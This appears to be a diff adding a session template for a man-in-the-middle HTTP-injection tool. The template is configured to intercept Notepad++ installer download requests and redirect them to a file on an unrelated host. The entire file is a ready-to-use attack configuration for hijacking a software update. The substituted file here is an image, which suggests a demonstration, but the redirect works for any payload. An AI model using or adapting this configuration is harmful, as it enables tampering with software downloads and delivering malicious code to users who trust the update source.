@@ -1,0 +1,25 @@
+	<SessionTemplate>
+<Config name="injection_notepadplusplus" description="Injecting into Notepad++ update request">
+</Config>
+
+<Plugins>
+<Plugin name="HTTP inject" dirname="HTTPInject">
+
+<ArrayOfInjectedURLRecord xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <InjectedURLRecord>
+    <Type>Redirect</Type>
+    <RequestedHost>download.tuxfamily.org</RequestedHost>
+    <RequestedURL>/notepadplus/6.6.8/npp.6.6.8.Installer.exe</RequestedURL>
+    <InjectedHost>buglist.io</InjectedHost>
+    <InjectedURL>/images/lookinggood.jpg</InjectedURL>
+    <InjectedFileFullPath />
+  </InjectedURLRecord>
+</ArrayOfInjectedURLRecord>
+</Plugin>
+
+
+
+
+</Plugins>
+
+</SessionTemplate>
